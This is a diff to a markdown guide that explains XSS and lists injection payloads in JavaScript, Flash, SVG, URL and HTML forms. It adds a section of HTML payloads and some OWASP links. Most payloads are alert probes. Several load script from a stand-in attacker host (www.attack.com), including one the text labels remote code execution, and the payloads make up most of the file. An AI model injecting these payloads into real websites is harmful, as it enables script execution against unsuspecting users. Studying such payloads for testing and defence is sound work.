@@ -9,15 +9,19 @@ Basically, a web application is a piece of software that runs in a web browser, 
 ### Vulnerability
 Vulnerability is precisely a weakness in a web application that is exploited through bugs or the structure of the web application itself, if it has flaws, and it is in these flaws that people with malicious intentions can gain access to sensitive and important data.
 
-<code>You can learn more about vulnerabilities here: https://owasp.org/www-community/vulnerabilities/.</code>
+<code>You can learn more about vulnerabilities here: https://owasp.org/www-community/vulnerabilities/</code>
 #### XSS
 **Cross-site scripting** or **XSS** is an injection attack frequently based on JavaScript, but it can also include HTML or any type of code that our browser can execute. They inject into a web application with the focus of being executed by other users. In this way, it can send malicious code to other people who may mistakenly click on a script that captures sensitive or important information. 
+
+<code>You can learn more about XSS here: 
+https://owasp.org/www-community/attacks/xss/
+</code>
 
 
 ### Payloads
 Payloads are basically Javascript codes that we can execute on target users' computers.
 
-Examples of payloads with **JavaScript**:
+### Examples of payloads with **JavaScript**:
 
 ```javascript
 Basic Alert Payload:
@@ -51,7 +55,7 @@ AJAX Command Execution Payload:
 
 ```
 
-Examples of payloads with **Flash**:
+### Examples of payloads with **Flash**:
 ```javascript
 
 Javascript Execution Payload:
@@ -64,7 +68,7 @@ Remote Code Execution Payload (inside a .swf file):
 load("http://www.attack.com/exploit.js");
 
 ```
-Example of payload with **SVG**:
+### Example of payload with **SVG**:
 ```javascript
 SVG Payload:
 <svg onload="alert('XSS')"></svg>
@@ -116,7 +120,7 @@ Script Inclusion Payload in Links (with base64):
     </style>
 </svg>
 ```
-Examples of payloads with **URL**:
+### Examples of payloads with **URL**:
 ```javascript
 Script Inclusion Payload in Query String:
 http://www.target.com/search?query=<script>alert('XSS')</script>
@@ -160,4 +164,42 @@ Script Inclusion Payload in HREF Attribute:
     Click here
 </a>
 ```
+### Examples of payloads with HTML:
+```javascript
+Image Inclusion Payload:
+<img src="http://www.attack.com/malicious.jpg"/>
 
+
+Hidden Script Inclusion Payload:
+ <img src="http://www.attack.com/malicious.jpg" onerror="alert('XSS')"/>
+
+
+ Link Script Inclusion Payload:
+ <a href="javascript:alert('XSS')">
+    Click Now!
+ </a>
+
+
+Script Inclusion Payload in a Form Field:
+<input type="text" value="" onfocus="alert('XSS')"/>
+
+
+Script Inclusion Payload in Iframe:
+<iframe src="javascript:alert('XSS')"></iframe>
+
+
+Script Inclusion Payload in Body Event:
+<body onload="alert('XSS')">
+
+
+Script Inclusion Payload in Image Event:
+<img src="image.png" onload="alert('XSS')"/>
+
+
+Script Inclusion Payload in Script Event:
+<script src="http://www.attack.com/script.js"></script>
+
+
+Script Inclusion Payload in CSS:
+<div style="background-image:url('javascript:alert(\'XSS\')');"></div>
+```
